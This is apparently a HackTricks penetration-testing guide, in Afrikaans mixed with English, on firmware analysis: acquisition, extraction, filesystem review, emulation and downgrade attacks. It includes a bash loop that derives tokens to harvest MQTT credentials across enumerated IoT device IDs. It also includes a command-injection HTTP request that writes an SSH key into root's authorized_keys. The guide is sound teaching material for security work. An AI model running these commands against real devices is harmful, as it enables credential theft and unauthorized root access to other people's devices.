# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te funksioneer deur die kommunikasie tussen hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang het tot belangrike instruksies van die oomblik dat dit aangeskakel word, wat tot die opstart van die bedryfstelsel lei. Die ondersoek van en moontlike wysiging aan firmware is 'n kritieke stap om sekuriteitskwesbaarhede te identifiseer.

## **Inligting-insameling**

**Inligting-insameling** is 'n kritieke aanvanklike stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die versameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel waarop dit loop
- Bootloader-besonderhede
- Hardeware-ontwerp en datablaaie
- Kodebasis-metrieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifiserings
- Argitektoniese en vloediagramme
- Sekuriteitsevaluerings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-gereedskap van onskatbare waarde, net soos die ontleding van enige beskikbare open-source sagtewarekomponente deur handmatige en geoutomatiseerde oorsigprosesse. Gereedskap soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese analise wat gebruik kan word om potensiële probleme te vind.

## **Firmware verkryging**

Die verkryging van firmware kan deur verskeie metodes bereik word, elk met sy eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- **Bou** dit vanaf voorsien instruksies
- **Aflaai** vanaf amptelike ondersteuningswebwerwe
- Gebruik **Google dork**-queries om gehoste firmware-lêers te vind
- Toegang tot **cloud storage** direk, met gereedskap soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intersepteer **updates** deur man-in-the-middle tegnieke
- **Uittrek** vanaf die toestel deur verbindings soos **UART**, **JTAG**, of **PICit**
- **Sniffing** na update-versoeke binne toestelkommunikasie
- Identifiseer en gebruik **hardcoded update endpoints**
- **Dumping** vanaf die bootloader of netwerk
- **Verwydering en uitlees** van die stoorchip, wanneer alles anders faal, met toepaslike hardeware-gereedskap

## Ontleding van die firmware

Nou dat jy **die firmware het**, moet jy inligting daaruit onttrek om te weet hoe om dit te hanteer. Verskeie gereedskap wat jy daarvoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie gereedskap vind nie, kyk die **entropy** van die image met `binwalk -E <bin>` — as die entropy laag is, is dit nie waarskynlik dat dit encrypted is nie. As die entropy hoog is, is dit waarskynlik encrypted (of op een of ander manier compressed).

Verder kan jy hierdie gereedskap gebruik om **lêers ingebed in die firmware** uit te trek:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Verkry die lêerstelsel

Met die voorafgenoemde gereedskap soos `binwalk -ev <bin>` behoort jy in staat te wees om die **filesystem uit te trek**.\
Binwalk haal dit gewoonlik uit binne 'n **map met die naam van die filesystem-tipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelsel-uittrekking

Soms sal binwalk **nie die magic byte van die filesystem in sy signatures hê nie**. In sulke gevalle, gebruik binwalk om die **offset van die filesystem te vind en die compressed filesystem vanaf die binary te carve** en die filesystem **handmatig uit te trek** volgens sy tipe met behulp van die stappe hieronder.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit om die Squashfs-lêerstelsel uit te trek.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om sy struktuur en moontlike kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie gereedskap om waardevolle data uit die firmware-beeld te ontleed en te onttrek.

### Initial Analysis Tools

'n Reeks opdragte word voorsien vir die aanvanklike inspeksie van die binêre lêer (verwys as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, strings te onttrek, binêre data te ontleed en die partisies- en lêerstelselbesonderhede te begryp:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te bepaal, word die **entropie** nagegaan met `binwalk -E <bin>`. Lae entropie dui op 'n gebrek aan enkripsie, terwyl hoë entropie moontlike enkripsie of kompressie aandui.

Vir die uittrekking van **embedded files** word gereedskap en hulpbronne soos die dokumentasie van **file-data-carving-recovery-tools** en **binvis.io** vir lêerinspeksie aanbeveel.

### Uittrekking van die lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die lêerstelsel uittrek, dikwels in 'n gids met die naam van die lêerstelseltipe (bv., squashfs, ubifs). Wanneer **binwalk** egter die lêerstelseltipe nie herken weens ontbrekende magic bytes nie, is handmatige uittrekking nodig. Dit behels dat mens `binwalk` gebruik om die offset van die lêerstelsel te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te kerf:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangend van die lêerstelsel-tipe (bv., squashfs, cpio, jffs2, ubifs), word verskillende opdragte gebruik om die inhoud handmatig uit te pak.

### Lêerstelsel-analise

Met die lêerstelsel uitgepak, begin die soektog na sekuriteitsfoute. Aandag word gegee aan onveilige netwerk daemons, hardcoded credentials, API endpoints, update server-funksionaliteite, nie-gecompileerde kode, opstartskripte, en gecompileerde binaries vir offline-analise.

**Sleutelplekke** en **items** om te inspekteer sluit in:

- **etc/shadow** and **etc/passwd** for user credentials
- SSL certificates and keys in **etc/ssl**
- Konfigurasie- en skriplêers vir potensiële kwesbaarhede
- Ingebedde binaries vir verdere analise
- Algemene IoT-toestel webservers en binaries

Verskeie gereedskap help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Sekuriteitskontroles op gecompileerde binaries

Beide bronkode en gecompileerde binaries wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Gereedskap soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeveiligde binaries te identifiseer wat uitgebuit kan word.

## Oes van cloud config en MQTT-credentials via afgeleide URL-tokens

Baie IoT-hubs haal hul per-toestel konfigurasie van 'n cloud-endpoint wat so lyk:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Tydens firmware-analise kan jy vind dat <token> lokaal afgelei word vanaf die device ID met 'n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat 'n deviceId en die STATIC_KEY ken in staat om die URL te herbou en cloud config af te trek, wat dikwels plaintext MQTT-credentials en topic-voorvoegsels openbaar.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-bootlogs

- Sluit 'n 3.3V UART-adapter (TX/RX/GND) aan en vang logs op:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Kyk vir reëls wat die cloud config URL pattern en broker address uitdruk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme vanaf firmware

- Laai binaries in Ghidra/radare2 en soek na die config path ("/pf/") of MD5 usage.
- Bevestig die algoritme (bv., MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest in hoofletters:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Haal cloud config en MQTT credentials

- Stel die URL saam en haal JSON met curl; parse met jq om secrets te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics te subscribe en te soek na sensitiewe events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (at scale, with authorization)

- Baie ekosisteme inkorporeer vendor OUI/product/type bytes wat gevolg word deur 'n sekwensiële agtervoegsel.
- Jy kan deur kandidaat-ID's iterateer, tokens aflei en configs programmaties ophaal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Aantekeninge
- Kry altyd uitdruklike toestemming voordat jy mass enumeration probeer.
- Gee voorkeur aan emulation of static analysis om secrets te herstel sonder om target hardware te wysig wanneer moontlik.

Die proses om emulating firmware moontlik te maak ondersteun **dynamic analysis** van óf 'n toestel se werking óf 'n individuele program. Hierdie benadering kan uitdagings ondervind met hardware- of architecture-afhanklikhede, maar om die root filesystem of spesifieke binaries na 'n toestel met ooreenstemmende architecture en endianness, soos 'n Raspberry Pi, of na 'n pre-built virtual machine oor te dra, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Om enkele programme te ondersoek, is dit belangrik om die program se endianness en CPU architecture te identifiseer.

#### Voorbeeld met MIPS Architecture

Om 'n MIPS architecture binary te emuleer, kan jy die volgende opdrag gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-instrumente te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dinamiese analise in die praktyk

Op hierdie stadium word óf 'n regte óf 'n geëmuleerde toestel-omgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die OS en filesystem te behou. Emulasie mag nie hardeware-interaksies perfek naboots nie, wat af en toe herbegin van die emulasiestelsel vereis. Analise behoort die filesystem te hersien, blootgestelde webpages en netwerkdienste te exploit, en bootloader-kwesbaarhede te ondersoek. Firmware-integriteitstoetse is krities om potensiële backdoor-kwesbaarhede te identifiseer.

## Runtime-analise tegnieke

Runtime-analise behels interaksie met 'n proses of binary in sy operasionele omgewing, en gebruik gereedskap soos gdb-multiarch, Frida, en Ghidra om breakpoints te stel en kwesbaarhede te identifiseer deur middel van fuzzing en ander tegnieke.

## Binary Exploitation and Proof-of-Concept

Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

## Vooraf-opgestelde bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf-gekonfigureerde omgewings vir firmware-sekuriteitstoetse, toegerus met die nodige gereedskap.

## Vooraf-opgestelde OS'e om firmware te analiseer

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is 'n distro bedoel om jou te help om security assessment en penetration testing van Internet of Things (IoT) devices uit te voer. Dit bespaar jou baie tyd deur 'n vooraf-gekonfigureerde omgewing te verskaf met al die nodige gereedskap gelaai.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04, vooraf gelaai met firmware security testing tools.

## Firmware Downgrade-aanvalle & onveilige update-meganismes

Selfs wanneer 'n vendor kriptografiese signature checks vir firmware images implementeer, word **version rollback (downgrade) protection dikwels weggelaat**. Wanneer die boot- of recovery-loader net die signature verifieer met 'n embedded public key maar nie die *version* (of 'n monotonic counter) van die image wat geflas word vergelyk nie, kan 'n aanvaller wettiglik 'n **ouer, kwesbare firmware installeer wat steeds 'n geldige signature dra** en sodoende gepatchete kwesbaarhede herintroduseer.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Voorbeeld: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (gedowngradeerde) firmware word die `md5` parameter direk in 'n shell-opdrag gekonkateneer sonder sanitisering, wat die inspuiting van arbitrêre opdragte moontlik maak (hier – die aktivering van SSH sleutel-gebaseerde root-toegang). Later firmware-weergawes het 'n basiese karakterfilter geïntroduceer, maar die gebrek aan downgrade-beskerming maak die herstel sinloos.

### Onttrekking van firmware uit mobiele apps

Baie verskaffers sluit volledige firmware-images in hul metgesel-mobiele toepassings, sodat die app die toestel oor Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik onversleuteld in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra`, of selfs net `unzip` laat jou toe om ondertekende images te onttrek sonder om die fisiese hardeware aan te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolelys vir die beoordeling van update-logika

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **version numbers** of 'n **monotonic anti-rollback counter** voordat dit geflasht word?
* Word die image binne 'n secure boot chain geverifieer (bv. signatures deur ROM code gekontroleer)?
* Voer userland code addisionele sanity checks uit (bv. allowed partition map, model number)?
* Hergebruik *partial* of *backup* update-strome dieselfde validation logic?

> 💡  As enige van bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback attacks.

## Kwetsbare firmware om te oefen

Om te oefen met die ontdek van kwesbaarhede in firmware, gebruik die volgende vulnerable firmware-projekte as 'n beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Verwysings

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
